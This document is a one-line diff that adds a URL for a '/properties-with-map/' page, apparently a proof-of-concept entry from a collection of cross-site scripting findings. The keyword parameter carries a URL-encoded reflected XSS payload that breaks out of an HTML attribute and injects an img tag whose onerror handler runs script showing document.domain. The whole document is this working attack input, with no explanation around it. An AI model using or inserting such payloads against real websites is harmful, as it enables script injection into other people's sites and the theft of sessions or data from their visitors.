@@ -1,0 +1,1 @@
+/properties-with-map/?status&keyword=%22%3E%3Cimg%20src=x%20onerror=(alert)(document.domain);//%22
